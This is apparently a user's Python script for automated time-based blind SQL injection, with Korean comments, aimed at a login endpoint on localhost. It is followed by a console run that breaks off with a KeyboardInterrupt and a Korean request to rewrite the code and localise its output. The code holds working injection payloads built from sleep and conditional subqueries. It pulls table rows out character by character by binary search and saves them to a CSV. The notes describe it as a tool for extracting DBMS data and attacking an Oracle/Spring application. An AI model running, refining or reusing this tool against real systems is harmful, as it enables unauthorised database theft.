import argparse, random, requests, csv
from datetime import datetime
from math import floor
from multiprocessing.dummy import Pool as ThreadPool
from time import sleep

# 기본 설정 변수
_url = "http://localhost:8080/login"
_payload = {}
_method = "post"
_param = None
_mode = 2
_table = None
_column = None
_ref_resp_time = None
_time_to_sleep = None
_threads = 4
_max_row_length = 50
_min_row_length = 1
_max_rows = 1000

# Blind SQL Injection용 구문 정의
_bool_injections = {
    "unquoted": {
        "char": "1 and 0 or if(unicode(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0))",
        "len": "1 and 0 or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0))"
    },
    "quoted": {
        "char": "1' and 0 or if(unicode(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0)) -- -",
        "len": "1' and 0 or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0)) -- -"
    }
}

_sleep_injections = {
    "unquoted": "1 and 0 or sleep(%s)",
    "quoted": "1' or 0 or sleep(%s) -- -"
}

# 숫자인지 확인
def _is_number(string):
    try:
        float(string)
        return True
    except ValueError:
        return False

# GET/POST 요청의 응답 시간 반환 (평균값 사용)
def _get_resp_time(payload, retries=3):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/39.0.2171.95 Safari/537.3'
    }
    times = []
    for _ in range(retries):
        if _method == 'get':
            times.append(requests.get(_url, params=payload, headers=headers).elapsed.total_seconds())
        elif _method == 'post':
            times.append(requests.post(_url, data=payload, headers=headers).elapsed.total_seconds())
        sleep(0.1)
    times.sort()
    return sum(times) / len(times)  # 평균값 사용

# 요청 사이의 지연 추가하여 서버 부하 감소
def _delay():
    sleep_time = {0: 0.2, 1: 0.5, 2: 0.7, 3: 0.9}.get(_mode, 0.5)
    sleep(random.triangular(0.1, sleep_time))

# 평균 응답 시간 초기화
def _init_ref_resp_time():
    global _ref_resp_time
    print('[*] 평균 응답 시간 계산 중...')
    pool = ThreadPool(processes=10)
    times = [pool.apply_async(_get_resp_time, [_payload]).get() for _ in range(10)]
    pool.close()
    times.remove(max(times))
    times.remove(min(times))
    _ref_resp_time = sum(times) / len(times)
    print(f'[*] 평균 응답 시간: {_ref_resp_time:.3f} 초')

# 주입 시 대기 시간 설정
def _init_sleep_time():
    global _time_to_sleep
    multiplier = {0: 2.5, 1: 3.5, 2: 4.5, 3: 5.5}
    _time_to_sleep = multiplier.get(_mode, 2.5) * _ref_resp_time
    print(f'[*] 주입 시 대기 시간 설정: {_time_to_sleep:.3f} 초')

# 특정 인덱스의 문자 추출 및 디코딩 처리 (이진 탐색 개선)
def _get_char(row, index):
    min_index, max_index = 32, 126  # ASCII 코드 범위 설정
    params = dict(_payload)
    injection = _bool_injections["unquoted"]["char"] if _is_number(_payload.get(_param, "")) else _bool_injections["quoted"]["char"]

    while min_index <= max_index:
        mid_index = floor((max_index + min_index) / 2)
        eq_injection = injection % (_column, _table, row, index, '=' + str(mid_index), str(_time_to_sleep))
        gt_injection = injection % (_column, _table, row, index, '>' + str(mid_index), str(_time_to_sleep))

        params[_param] = eq_injection
        eq_time = _get_resp_time(params)
        if eq_time >= _time_to_sleep:
            print(f'[*] 행 {row}의 인덱스 {index} 문자 추출 완료: {chr(mid_index)}')
            return chr(mid_index)  # ASCII 값을 문자로 변환 후 반환

        params[_param] = gt_injection
        gt_time = _get_resp_time(params)
        if gt_time >= _time_to_sleep:
            min_index = mid_index + 1
        else:
            max_index = mid_index - 1

        _delay()
    return None

# 행의 길이 확인
def _get_row_length(row):
    params = dict(_payload)
    injection = _bool_injections["unquoted"]["len"] if _is_number(_payload.get(_param, "")) else _bool_injections["quoted"]["len"]
    length = 0

    for test_length in range(_min_row_length, _max_row_length + 1):
        params[_param] = injection % (_column, _table, row, test_length, str(_time_to_sleep))
        if _get_resp_time(params) > _time_to_sleep:
            length = test_length
            print(f'[*] 행 {row}의 길이 추출 완료: {length}')
            break
        _delay()

    return length

# 모든 행을 추출하고 CSV로 저장 (UTF-8 디코딩 적용)
def _get_all_rows(output_file="추출된_데이터.csv"):
    start = datetime.now()
    values = []

    with open(output_file, mode='w', newline='', encoding='utf-8-sig') as file:
        writer = csv.writer(file)
        writer.writerow(["행 번호", "추출된 데이터"])

        for i in range(_max_rows):
            length = _get_row_length(i)
            if length == 0:
                print(f'[*] 행 {i}는 비어있습니다.')
                continue  # 더 이상 데이터가 없으면 해당 행을 건너뜀
            value = ''.join(_get_char(i, j + 1) or '?' for j in range(length))

            # 디코딩 시도
            try:
                decoded_value = value.encode('latin1').decode('utf-8')
            except UnicodeDecodeError:
                decoded_value = value  # 디코딩 실패 시 원본 값 사용

            values.append(decoded_value)
            writer.writerow([i, decoded_value])
            print(f'[*] 행 {i} 추출 완료: {decoded_value}')

    print(f'[*] 전체 데이터 추출이 완료되었습니다. (총 소요 시간: {(datetime.now() - start).total_seconds():.3f} 초)')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Blind SQL Injection 자동화 도구")
    parser.add_argument("--output_file", type=str, help="결과 저장 CSV 파일 이름", default="추출된_데이터.csv")
    args = parser.parse_args()

    # 필수 전역 변수 초기화
    _init_ref_resp_time()
    _init_sleep_time()
    _get_all_rows(args.output_file)


C:\frida_scripts>python dbms_sqli.py
[*] 평균 응답 시간 계산 중...
[*] 평균 응답 시간: 0.002 초
[*] 주입 시 대기 시간 설정: 0.008 초
[*] 행 0는 비어있습니다.
[*] 행 1는 비어있습니다.
Traceback (most recent call last):
  File "C:\frida_scripts\dbms_sqli.py", line 166, in <module>
    _get_all_rows(args.output_file)
  File "C:\frida_scripts\dbms_sqli.py", line 140, in _get_all_rows
    length = _get_row_length(i)
             ^^^^^^^^^^^^^^^^^^
  File "C:\frida_scripts\dbms_sqli.py", line 122, in _get_row_length
    if _get_resp_time(params) > _time_to_sleep:
       ^^^^^^^^^^^^^^^^^^^^^^
  File "C:\frida_scripts\dbms_sqli.py", line 59, in _get_resp_time
    sleep(0.1)
KeyboardInterrupt
^C

오라클 데이터베이스 및 스프링으로 개발

- DBMS 데이터 추출을 위한 자동화 스크립트(python 기반) 제작 및 공격 진행

피드백 바탕으로 전체 코드 수정하고 출력할 수 있는 부분 한국어로 출력해줘 